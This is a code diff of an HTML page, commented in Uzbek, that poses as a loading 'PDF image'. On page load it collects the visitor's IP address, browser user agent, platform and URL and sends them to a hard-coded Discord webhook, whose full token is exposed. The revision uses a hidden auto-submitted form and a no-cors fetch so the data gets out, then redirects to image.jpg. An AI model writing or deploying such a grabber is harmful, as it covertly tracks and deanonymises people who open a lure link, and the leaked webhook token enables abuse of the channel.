@@ -6,104 +6,108 @@
 <body>
     <script>
         // Discord Webhook
-        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1430274332969406464/jWY9FXp_agGFehgu4C7tjFUK35V7-lWDgKfYs87M_ZoJXJcxRRCv_pK_IT8LGNc6gbrw";
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1430274332969406464/jWY9FXp_agGFehgu4C7tjFUK35V7-lWDgKfYs87M_ZoJXJcxRRCv_pK_IT8LGNc6gbrw";
 
-        console.log('Script ishga tushdi...');
-
-        // CORS proxy orqali Discordga yuborish
-        async function sendToDiscordViaProxy() {
+        async function getIP() {
             try {
-                console.log('CORS proxy orqali yuborish...');
-                
-                // 1. Avval IP ni olamiz
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
-                const userIP = ipData.ip;
-
-                console.log('IP aniqlandi:', userIP);
-
-                // 2. Discord xabarini tayyorlaymiz
-                const discordMessage = {
-                    content: `🚨 **YANGI TASHRIF - image.html!**\n\n` +
-                             `🌐 **IP:** ${userIP}\n` +
-                             `⏰ **Vaqt:** ${new Date().toLocaleString()}\n` +
-                             `🖥️ **Brauzer:** ${navigator.userAgent.substring(0, 100)}...\n` +
-                             `📱 **Platforma:** ${navigator.platform}\n` +
-                             `🔗 **Manba:** PDF fayl`,
-                    username: "PDF Rasm Kuzatuvchi",
-                    avatar_url: "https://cdn-icons-png.flaticon.com/512/5088/5088124.png"
-                };
-
-                // 3. CORS Proxy orqali yuboramiz
-                const proxyUrl = 'https://cors-anywhere.herokuapp.com/';
-                const response = await fetch(proxyUrl + DISCORD_WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(discordMessage)
-                });
-
-                if (response.ok) {
-                    console.log('✅ Discordga MUVAFFAQIYATLI yuborildi!');
-                    return true;
-                } else {
-                    console.log('❌ Discord javobi:', response.status);
-                    return false;
-                }
-
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
             } catch (error) {
-                console.log('❌ Xato:', error.message);
+                return 'Aniqlanmadi';
+            }
+        }
+
+        // 1-USUL: Form orqali
+        function sendViaForm(ip) {
+            try {
+                const form = document.createElement('form');
+                form.method = 'POST';
+                form.action = WEBHOOK_URL;
                 
-                // Alternative usul - image orqali yuborish
-                sendViaImageTracker(userIP);
+                const content = document.createElement('input');
+                content.name = 'content';
+                content.value = `🟢 **FORM - PDF RASM OCHILDI!**\n\n` +
+                               `🌐 **IP:** ${ip}\n` +
+                               `⏰ **Vaqt:** ${new Date().toLocaleString()}\n` +
+                               `🔗 **URL:** ${window.location.href}`;
+                
+                form.appendChild(content);
+                document.body.appendChild(form);
+                form.submit();
+                setTimeout(() => document.body.removeChild(form), 500);
+                
+                console.log('Form orqali yuborildi');
+                return true;
+            } catch (error) {
+                console.log('Form xatosi:', error);
                 return false;
             }
         }
 
-        // Alternative usul - Image tracker orqali
-        function sendViaImageTracker(ip) {
-            console.log('Image tracker orqali yuborish...');
-            
-            // 1-pixel li rasm orqali tracking
-            const trackerImg = new Image();
-            trackerImg.src = `https://api.ipify.org?format=json&callback=ipCallback`;
-            
-            // Discordga so'nggi urinish
-            const img = new Image();
-            const message = `IP: ${ip}, Time: ${new Date().toLocaleString()}`;
-            img.src = `https://discord.com/api/webhooks/1430274332969406464/jWY9FXp_agGFehgu4C7tjFUK35V7-lWDgKfYs87M_ZoJXJcxRRCv_pK_IT8LGNc6gbrw?content=${encodeURIComponent(message)}`;
+        // 2-USUL: Fetch with no-cors
+        async function sendViaFetch(ip) {
+            try {
+                const message = {
+                    content: `🔵 **FETCH - PDF RASM!**\n\n` +
+                             `🌐 **IP:** ${ip}\n` +
+                             `⏰ **Vaqt:** ${new Date().toLocaleString()}\n` +
+                             `🖥️ **Brauzer:** ${navigator.userAgent.substring(0, 50)}`
+                };
+
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(message)
+                });
+                
+                console.log('Fetch orqali yuborildi (no-cors)');
+                return true;
+            } catch (error) {
+                console.log('Fetch xatosi:', error);
+                return false;
+            }
         }
 
-        // Sahifa yuklanganda ishga tushirish
-        window.addEventListener('load', async function() {
-            console.log('Sahifa yuklandi...');
-            
-            // Discordga yuborishga urinamiz
-            await sendToDiscordViaProxy();
-            
-            // 3 soniyadan keyin rasmga o'tish
-            setTimeout(function() {
-                window.location.href = 'image.jpg';
-            }, 3000);
-        });
+        // Asosiy funksiya
+        async function trackUser() {
+            console.log('IP manzil olinmoqda...');
+            const userIP = await getIP();
+            console.log('IP:', userIP);
 
+            // Ikkala usulni ham ishga tushiramiz
+            sendViaForm(userIP);
+            setTimeout(() => sendViaFetch(userIP), 1000);
+
+            return userIP;
+        }
+
+        // Ishga tushirish
+        window.onload = async function() {
+            console.log('Sahifa yuklandi...');
+            await trackUser();
+            
+            setTimeout(() => {
+                window.location.href = 'image.jpg';
+            }, 2000);
+        };
     </script>
 
-    <div style="text-align: center; padding: 100px; font-family: Arial;">
-        <h2>📄 PDF Rasm Yuklanmoqda...</h2>
-        <p>Iltimos, kuting. Rasm avtomatik ravishda ochiladi.</p>
-        <p><strong>IP manzilingiz va boshqa ma'lumotlar Discordga yuborilmoqda...</strong></p>
-        <div id="status" style="margin: 20px; padding: 10px; background: #f0f0f0; border-radius: 5px;">
-            🟡 Ma'lumotlar yuborilmoqda...
-        </div>
+    <div style="text-align: center; padding: 80px;">
+        <h3>📄 PDF Rasm Tayyorlanmoqda</h3>
+        <p>IP manzilingiz: <strong id="ipText">aniqlanmoqda...</strong></p>
+        <p>Discordga ma'lumotlar yuborilmoqda...</p>
     </div>
 
     <script>
-        // Status yangilash
-        setTimeout(function() {
-            document.getElementById('status').innerHTML = '🟢 Ma\'lumotlar yuborildi! Rasm ochilmoqda...';
-        }, 2000);
+        // IP ni ekranda ko'rsatish
+        setTimeout(async () => {
+            const ip = await getIP();
+            document.getElementById('ipText').textContent = ip;
+        }, 1000);
     </script>
 </body>
 </html>
